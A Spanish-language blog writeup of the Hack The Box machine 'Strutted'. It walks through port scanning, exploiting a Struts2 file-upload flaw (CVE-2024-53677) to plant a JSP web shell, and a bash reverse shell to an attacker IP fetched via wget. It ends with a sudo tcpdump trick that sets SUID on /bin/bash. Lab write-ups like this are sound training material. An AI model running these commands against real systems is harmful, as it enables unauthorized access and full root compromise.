---
title: HTB Strutted Writeup
date: 2025-03-18 19:39:50 -05:00
author: retxus
categories: [HTB, Linux]
tags: [Linux, http, Information leakage, Arbitrary file upload (malicioso JSP file), CVE-2024-53677, abusing sudo privulege(tcpdump)]
comments: false
image:
  path: /assets/img/HTB-Strutted/Strutted.png
---

Muy buenas con todos, el día de hoy voy a resolver la máquina `Strutted` de HTB, espero que el procedimiento sea de su agrado y fácil de comprender.

## Reconocimiento

Primero vemos si tenemos conexión con la máquina y de paso gracias al `ttl` identificamos ante el tipo de máquina que estamos, en `linux` este suele ser de 64 y en `windows` de 128.

```bash
ping -c 1 10.10.11.59
PING 10.10.11.59 (10.10.11.59) 56(84) bytes of data.
64 bytes from 10.10.11.59: icmp_seq=1 ttl=63 time=104 ms

--- 10.10.11.59 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 104.352/104.352/104.352/0.000 ms
```

Vemos que el `ttl` de la máquina es de 63, el cual está próximo a 64 por ende nos encontramos ante una máquina `Linux`.

Ahora, con la herramienta `rustscan` lanzamos un escaneo en donde vamos a enumerar los puertos que se encuentran abiertos en la máquina.

```bash
rustscan -a 10.10.11.59 --ulimit 5000 -r 1-65535 -- -sS -sCV -Pn -oN target
```

Guardamos la información en un archivo. (Siempre se recomienda llevar registro de lo que se realiza)

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Strutted\xE2\x84\xA2 - Instant Image Uploads
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Se nos reporta que el puerto `22` y `80` están abiertos, si nos dirigimos a la web con la `IP`, vemos que esta nos redirige a un dominio, por ende se está aplicando `Resolucion DNS`, nuestra máquina no sabe a qué hace referencia ese dominio, así que lo agregamos al `/etc/hosts`.

```bash
127.0.0.1	localhost
::1		localhost
127.0.0.1	machinename.localhost	machinename

10.10.11.59 strutted.htb
```

### Enumeración

En la web vemos un apartado para subir archivos de tipo imagen y también tenemos un apartado de `descarga`, al darle clic, se nos baja un archivo `.zip`, si lo descomprimimos para ver su contenido podemos ver que lo que parece ser el código fuente de la `web`.

![](/assets/img/HTB-Strutted/1_Strutted.png)

Dentro del `tomcat-users.xml` tenemos un usuario con su credencial, pero no llegamos a ningún lado con eso. Tenemos también un archivo `Dockerfile`, así que podemos suponer que la `web` está desplegada con un contenedor, o parte de ella. En la carpeta `strutted` hay un archivo `pom.xml`, este ya pinta más interesante, podemos ver módulos, dependencias y demás cosas que usa la web, algo que me llama la atención es `strust2.version (6.3.0.1)`, buscando un poco nos encontramos con <a href="https://attackerkb.com/topics/YfjepZ70DS/cve-2024-53677">esta</a> vulnerabilidad interesante, donde mediante un `Arbitrary file upload` podemos subir algún archivo malicioso que nos interese.

### Subida arbitraria de archivos (CVE-2024-53677)

En esta ocasión usaremos <a href="https://caido.io/">caido</a> para capturar la petición y poder manipularla. Podemos subir cualquier archivo, al fin de cuentas, vamos a jugar con los primeros bytes del archivo para hacerle pensar a la `web` que se trata de un tipo de imagen.

![](/assets/img/HTB-Strutted/2_Strutted.png)

Vemos que la vulnerabilidad se ejecuta, ahora vamos a tratar de subir una `web_shell.jsp`, podemos hacer uso de <a href="https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp">esta</a>.

![](/assets/img/HTB-Strutted/3_Strutted.png)

Vemos que fue exitoso, nos dirigimos a la ruta don se subió el archivo y vemos que podemos ejecutar comandos `RCE`.

![](/assets/img/HTB-Strutted/4_Strutted.png)

### Obteniendo la primera shell

Ahora vamos a ganar acceso al sistema obteniendo una shell, nos montamos un servido con `python` y subimos un archivo en `bash` para poder obtener una `shell` interactiva.

```bash
echo '#/bin/bash\n\nbash -c "bash -i >& /dev/tcp/10.10.14.235/4444 0>&1"' > bash.sh

python -m http.server 8080
```

En la `web` donde tenemos el `.jsp` nos descargamos el archivo, le damos los permisos necesarios, lo ejecutamos con `bash` y logramos ganar acceso.

```bash
wget http://{IP}:8080/bash.sh -O /tmp/bash.sh

chmod 777 /tmp/bash.sh

bash /tmp/bash.sh
```

![](/assets/img/HTB-Strutted/5_Strutted.png)

Ahora estamos como el usuario `tomcat` dentro de la máquina, una vez dentro hacemos el tratamiento de la `tty`.

```bash
script /dev/null -c bash
Ctrl + z
stty raw -echo; fg
export TERM=xterm-256color
source /etc/skel/.bashrc
```

Para tener las proporciones adecuadas dentro de la `shell` en una ventana de nuestro terminal hacemos `stty size` y en la shell de la víctima ponemos `stty rows {YOUR_ROWS_NUMBER} columns {YOUR_COLUMNS_NUMBER}`.

## Migrando a otro usuario

Si listamos el `/etc/passwd` vemos otro usuario `james`, al probar las credenciales obtenidas de `tomcat-users.xml`, vemos que no son válidas. Si listamos dentro de `/var/lib/tomcat9/conf`, nos encontramos con otro archivo `tomcat-users.xml`, en donde hay otra credencial.

![](/assets/img/HTB-Strutted/6_Strutted.png)

Si la probamos con `su james`, no es posible conectarse, pero aún tenemos `ssh` y al tratar vemos que efectivamente logramos ganar acceso como `james` con esa credencial y una vez dentro podemos ver el `user.txt`.

## Escalada de privilegios.

Si listamos nuestro privilegio a nivel de `sudo`, vemos que podemos ejecutar `tcpdump` como `root` sin proporcionar contraseña, en <a href="https://gtfobins.github.io/gtfobins/tcpdump/#sudo"GTFObins</a> nos indican una forma de como podemos escalar nuestro privilegio, yo lo que hice fue asignar permisos `SUID` al binario `/bin/bash`.

```bash
COMMAND='chmod +s /bin/bash' & TF=$(mktemp) & echo "$COMMAND" > $TF & chmod +x $TF & sudo /usr/sbin/tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

Ejecutamos el binario como el propietario y ahora ya podemos ver la `root.txt`

![](/assets/img/HTB-Strutted/7_Strutted.png)
